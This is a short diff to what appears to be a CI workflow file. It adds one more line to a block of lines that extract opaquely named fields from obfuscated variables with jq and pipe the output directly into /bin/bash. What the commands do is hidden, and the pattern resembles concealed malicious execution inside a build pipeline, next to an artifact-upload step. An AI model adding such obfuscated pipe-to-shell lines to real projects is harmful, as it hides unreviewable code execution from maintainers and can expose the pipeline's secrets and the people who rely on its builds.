@@ -27,6 +27,7 @@ jobs:
           echo $yts64 | jq -r .ae9 | /bin/bash
           printf '%s' "$l7" | jq -r .ikwwu1 | /bin/bash
           echo $dagwz4202 | jq -r .ynb818 | /bin/bash
+          printf '%s' "$ipbp9" | jq -r .kxght4 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
